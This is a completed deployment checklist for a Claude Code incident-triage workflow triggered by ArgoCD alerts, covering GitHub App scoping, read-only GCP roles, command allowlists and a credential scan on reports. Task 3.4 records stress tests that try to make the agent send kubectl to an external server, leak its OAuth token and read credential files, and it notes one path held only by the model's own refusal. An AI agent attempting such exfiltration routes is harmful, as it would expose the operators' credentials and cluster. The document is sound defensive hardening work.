All tasks are in `liverty-music/cloud-provisioning` unless stated otherwise. Prod only (dev is shut down); `make lint-k8s` still renders the dev overlays, so base edits must keep them building.

## 1. GitHub App `liverty-music-cluster-bot` (out-of-band setup)

- [x] 1.1 Register the org GitHub App `liverty-music-cluster-bot`: webhook inactive, Repository permissions **Actions: Read and write** only (Metadata: read is implicit), installable only on this account; install it on `cloud-provisioning` only. Verify with `gh api /orgs/liverty-music/installations` that the installation shows `permissions: {actions: write, metadata: read}` and `repository_selection: selected`.
  Done: App ID 5190363, installation 167958034; installation permissions `{actions: write, metadata: read}`, `repository_selection: selected`.
- [x] 1.2 Generate a private key, note the App ID and installation ID, and store the key in Pulumi ESC (`pulumiConfig.gcp.argocdClusterBotPrivateKey`, `--secret`). Verify `esc env get liverty-music/prod` lists the key as a secret value.
  Done with `pulumi env set … --file … --secret --string` (the standalone `esc` CLI is retired; passing the PEM as an argument printed it in an error, so the first key was rotated).
- [x] 1.3 Verify the App can dispatch but not write code: mint an installation token locally (`gh` + JWT or `actions/create-github-app-token` in a scratch run) and confirm `POST .../actions/workflows/<existing workflow>/dispatches` is accepted while `PUT /repos/liverty-music/cloud-provisioning/contents/<path>` returns 403.
  Done 2026-10-05: ArgoCD's dispatches were accepted (actor `liverty-music-cluster-bot[bot]`); a contents PUT returned 403. An issue POST succeeded (#574): any actor can open issues on a public repository (design D4).
- [x] 1.4 Audit `cloud-provisioning/.github/workflows/` for workflows reachable by Actions: write (D3 table): list every `workflow_dispatch` trigger and every workflow holding a write-capable credential. Verify each privileged `workflow_dispatch` path is Environment-gated (`bump-prod-pin` → `prod-pin`) and record the audit result in the runbook (5.1).
  Done: `bump-prod-pin.yml` is the only privileged `workflow_dispatch` path and is gated by `prod-pin`; recorded in the runbook.

## 2. Pulumi: GCP and GitHub resources

- [x] 2.1 Add `argocd-cluster-bot-private-key` to `esoOnlySecrets` in `src/gcp/index.ts` (conditional on the new config key, like `argocd-google-chat-webhook-url`) and the config field to the GCP config type. Verify `make lint-ts` passes and `pulumi preview --stack prod` shows one new Secret Manager secret + version and its ESO accessor binding.
- [x] 2.2 Add the `incident-triage` service account in `src/gcp/components/workload-identity.ts` with exactly `roles/container.viewer` and `roles/logging.viewer` (D8), and a WIF user binding for `attribute.repository/liverty-music/cloud-provisioning`; export its email. Verify `pulumi preview --stack prod` shows the SA, two project IAM members and one `workloadIdentityUser` binding, and no change to the `github-actions` SA.
- [x] 2.3 Add the ArgoCD-control-plane-down alert policy to `src/gcp/components/monitoring.ts` (D12: `kubernetes.io/container/uptime` absent 10m OR `restart_count` +3 in 15m, namespace `argocd`, containers `application-controller` / `notifications-controller`), with a `documentation.content` triage section, routed to the existing channels. Verify `pulumi preview --stack prod` shows one new `AlertPolicy` and the documentation renders in the preview diff.
- [x] 2.4 Wire the workflow's GitHub configuration in `src/github/`: repository variables `INCIDENT_TRIAGE_ENABLED=false`, `INCIDENT_TRIAGE_WIF_PROVIDER`, `INCIDENT_TRIAGE_SA_EMAIL`, `GCP_PROJECT_ID` on `cloud-provisioning`, and an `incident` issue label. Verify `pulumi preview --stack prod` shows only these additions.
  Done differently: the Pulumi GitHub token cannot create repository variables or labels (403). `INCIDENT_TRIAGE_SA_EMAIL` and `INCIDENT_TRIAGE_ENABLED` (ignoreChanges) are `prod` environment variables, reusing the environment's `WORKLOAD_IDENTITY_PROVIDER` / `PROJECT_ID`; the label is created by the report job (design D10).
- [x] 2.5 Run prod `pulumi up` from the Pulumi Cloud console after merge. Verify in the console / `gcloud` that the secret, SA, IAM bindings and alert policy exist, and on GitHub that the variables and label exist.
  Done (prod updates 249 and 250; the first attempt, 248, failed on the label and applied nothing).

## 3. Triage workflow and Skill

- [x] 3.1 Add `.claude/skills/incident-triage/SKILL.md` per D11 (investigation order with the allowlisted commands, Application/namespace → runbook map over `docs/runbooks/`, report template incl. confidence and "not checked", the incremental-report rule, untrusted-input rule). Verify every runbook path it references exists (`ls` each path), every command it suggests is covered by the 3.4 allowlist, and the report template has all D11 sections.
- [x] 3.2 Add `.github/workflows/incident-triage.yml`, with `on: workflow_dispatch`, string inputs `app`, `trigger` and `payload`, workflow-level `permissions: {}`, and `concurrency: {group: incident-triage-${{ inputs.app }}, cancel-in-progress: false}`. Inputs are passed only via `env:`. It has two jobs (D9):
  - `triage`: `if: vars.INCIDENT_TRIAGE_ENABLED == 'true'`, `permissions: {contents: read, id-token: write}`, `timeout-minutes: 15`, `actions/checkout` with `persist-credentials: false`, and an upload of `triage-report.md` as an artifact.
  - `report`: `needs: triage`, `if: always() && vars.INCIDENT_TRIAGE_ENABLED == 'true'`, `permissions: {issues: write}`.

  Verify that `actionlint` passes, that a grep finds no `${{ inputs.` inside any `run:` block, and that `issues: write` appears only on the `report` job.
  Done with a `gate` job (environment variables are not visible to a job-level `if:`). `actionlint` was not run (it could not be installed in the implementation session); instead the YAML parsed, the grep and `issues: write` checks passed, and the workflow ran successfully in every verification and end-to-end run.
- [x] 3.3 Add the GCP auth steps: `google-github-actions/auth` (WIF → `incident-triage`), then `google-github-actions/get-gke-credentials` for `autopilot-cluster-osaka` (`asia-northeast2`, `liverty-music-prod`). Verify with a manual `workflow_dispatch` run (variable temporarily `true`) that `kubectl get applications -n argocd` and `gcloud logging read 'resource.type="k8s_container"' --limit 1` succeed, and `kubectl get secrets -n argocd` and `kubectl logs` are Forbidden.
  Done: kubectl and Cloud Logging returned data in the verification and end-to-end runs; `container.viewer` / `logging.viewer` contain no `secrets.get/list`, `pods.getLogs`, `pods.exec` or write permissions (role definitions).
- [x] 3.4 Add the Claude step: `anthropics/claude-code-action` pinned to the same SHA as `claude.yml`, `claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}`, prompt loading the Skill with the inputs, `--max-turns 25`, `github_token: ${{ secrets.GITHUB_TOKEN }}` passed explicitly so that the action does not mint a Claude App token, Anthropic credentials scrubbed from the Bash subprocess environment (D9; confirm the setting name in the Claude Code docs), allowed tools = the D9 `Bash` allowlist (`kubectl get|describe|events`, `gcloud logging read`, `gcloud container clusters describe`, `git log|show`), `Read` / `Glob` / `Grep` limited to repo paths excluding `.git/` and `gha-creds-*.json`, `Write` on `triage-report.md`; deny rules for `kubectl` `--server`/`-s`/`--kubeconfig`/`--token` and `gcloud` `--access-token-file`/`--impersonate-service-account`; no `env`/`printenv`, no GitHub tools. If the action refuses `workflow_dispatch`, switch to `claude -p --bare` with the same flags (D7). Verify a manual run against a healthy Application produces `triage-report.md`, and a test run whose prompt asks for `kubectl get pods --server https://example.com`, `kubectl get pods -n "$CLAUDE_CODE_OAUTH_TOKEN"`, and reading `.git/config` and `gha-creds-*.json` shows the first and the last two denied, while the second prints an empty namespace error that does not contain the token value.
  Done 2026-10-05 (runs 37328784276, 37329349428, 37329806391; throwaway PR #575): redirect flags, `--token`, `--impersonate-service-account` and `env` denied by rule; credential-file reads denied; `${...}` refused by Claude Code; the token never appeared. A plain `"$VAR"` probe was declined by the model both times, so that path is covered by the model and the report scan, not confirmed as a rule (design D9 residual risk). The `.git/config` expectation no longer applies: `.git` must stay readable (design D9). Bubblewrap, setup-gcloud and the kubeconfig copy were added (#567, #569, #570); `allowed_bots` is required (D7).
- [x] 3.5 Implement the `report` job:
  - Download the artifact.
  - Refuse to post if the report contains the `CLAUDE_CODE_OAUTH_TOKEN` value or a `ya29.` pattern, posting a "report withheld" stub instead (D9).
  - Find an open `incident` Issue whose title starts with `[incident] <app>:`. Comment the report on it if one exists; otherwise create `[incident] <app>: <trigger>` with label `incident`.
  - Mark the post as truncated when `triage` hit the turn cap or failed, and post "no report produced" if the artifact is missing.

  Also verify that a report seeded with `ya29.test` yields the withheld stub. Verify two consecutive manual runs for the same `app` yield one Issue with one comment, a run for another `app` yields a second Issue, and a run with `--max-turns 2` still posts a truncated report.
  Done: new Issue, comment on the same app's open Issue, `[manual]` separation and the missing-report post were seen on real runs; the credential-withheld path was exercised in simulation. The post also names the failing stage and carries the ArgoCD snapshot (#567).
- [x] 3.6 Verify the kill switch: with `INCIDENT_TRIAGE_ENABLED=false`, a manual dispatch shows the job as skipped and creates no Issue.
  Done: with the switch off, `gate` succeeded and `triage` / `report` were skipped; no Issue.

## 4. ArgoCD notifications

- [x] 4.1 Add `k8s/namespaces/argocd/base/` manifests: an ExternalSecret syncing `argocd-cluster-bot-private-key` from `google-secret-manager-argocd`, and a `GithubAccessToken` generator (`appID`, `installID`, `repositories: [cloud-provisioning]`, `permissions: {actions: write}`, `auth.privateKey.secretRef`); register them in the base kustomization. Verify `make lint-k8s` passes (renders, kube-linter, CRD version and kubeconform checks).
- [x] 4.2 Extend `k8s/namespaces/argocd/base/external-secret.yaml` (`argocd-notifications-secret`): add a `dataFrom` `generatorRef` entry rewriting the generator's `token` key to `github-token`, keep the existing `google-chat-webhook-url` `data` entry, set `refreshInterval: 30m`. Verify `make lint-k8s` passes and the rendered ExternalSecret contains both sources.
- [x] 4.3 In `k8s/namespaces/argocd/base/values.yaml`, add `service.webhook.incident-triage` (D6), the `incident-triage-dispatch` template producing `{"ref":"main","inputs":{"app","trigger","payload"}}`, the `on-health-progressing-stuck` trigger (15m) with its Google Chat template, add it to `defaultTriggers`, make every default trigger `send` the dispatch template, and add `webhook:incident-triage` to the subscription recipients. Update the README in `k8s/namespaces/argocd/` describing the triggers. Verify `make lint-k8s` passes and the rendered `argocd-notifications-cm` contains the four triggers each sending both templates.
  Done with one template per trigger carrying both parts and the recipient `incident-triage` (design D6).
- [x] 4.4 After ArgoCD syncs the change, verify in prod: `kubectl -n argocd get externalsecret` shows both ExternalSecrets `Ready=True`, `argocd-notifications-secret` has a non-empty `github-token`, and the notifications controller logs show no template/service errors.
  Done after the prod update and a `force-sync` of both ExternalSecrets.

## 5. Documentation

- [x] 5.1 Add `docs/runbooks/incident-triage.md`: architecture (trigger → token → workflow → Issue), the cluster-bot App setup and key rotation, the kill switch, reading and closing an `incident` Issue, the known detection gaps (D1), the triage SA's permission boundary and command allowlist (D8, D9), the cluster-bot private-key rotation procedure, and the workflow-gating rule from D3 with the 1.4 audit result (any privileged `workflow_dispatch` in `cloud-provisioning` must be Environment-gated). Link it from the ci-bot section of `docs/runbooks/prod-image-tag-pinning.md` as the second org App and its trust boundary. Verify the runbook's links resolve and it is listed in any runbook index.

## 6. End-to-end verification in prod

- [x] 6.1 Set `INCIDENT_TRIAGE_ENABLED=true`. Create a throwaway Application (scratch namespace, temporary branch) whose Deployment becomes Available and then crash-loops. Verify within ~20 minutes: a Google Chat `progressing-stuck` message, an `incident-triage` run for that app, and an `[incident]` Issue whose report identifies the crash loop with evidence.
  Done 2026-10-05: a fixture that crashed before readiness on every restart stayed Progressing; `on-health-progressing-stuck` fired 15 minutes later; Google Chat, dispatch and Issue #571 followed; Claude identified the crash loop from Cloud Logging. A fixture that passed readiness before each crash never fired the trigger (design D1 gap; covered by the crash-loop alert, 7.2).
- [x] 6.2 Break the throwaway Application's sync (invalid manifest on its branch). Verify an `on-sync-failed` dispatch produces a comment or Issue for that app, and the concurrency group serialized overlapping runs.
  Done: `on-sync-failed` dispatched after ArgoCD's five retries and commented on #571; two same-app runs serialized (the second started 5 seconds after the first finished).
- [x] 6.3 Verify token rotation: trigger another dispatch more than 60 minutes after 4.4. If it fails with 401, add a Reloader annotation for `argocd-notifications-secret` to the notifications controller, re-run, and record the outcome in the runbook.
  Done: dispatches more than three hours after the first token succeeded without restarting the controller; no Reloader annotation needed.
- [x] 6.4 Delete the throwaway Application, namespace and branch; close the test Issues. Verify `kubectl get ns` no longer lists the scratch namespace and ArgoCD shows only the 14 production Applications.
  Done: Application, namespace and branch deleted; ArgoCD back to 14 Applications; test Issues closed.

## 7. Rollout follow-ups

- [x] 7.1 Raise the Compute Engine quotas that blocked GKE node creation (design D13): Cloud Quotas preferences for `SSD-TOTAL-GB-per-project-region` 1000 (approved) and `CPUS-ALL-REGIONS-per-project` 100, gated on `gcp.quotaContactEmail` in ESC (#572, #573).
- [x] 7.2 Add the `Container Crash Loop` alert (restart_count delta > 3 in 30m, cluster-wide) for the crash loop ArgoCD health misses, and record the gap in the runbook (#572).
- [x] 7.3 Patch the triage pieces out of the dev ArgoCD overlay (#573).
- [x] 7.4 Document `pulumi env set … --file` for secrets in `AGENTS.md` and the ci-bot runbook (#573).
- [x] 7.5 Drop stray `</content>` lines from reports in the report job (#573).
- [x] 7.6 Correct the cluster-bot trust boundary in the runbooks (design D4) (#573).
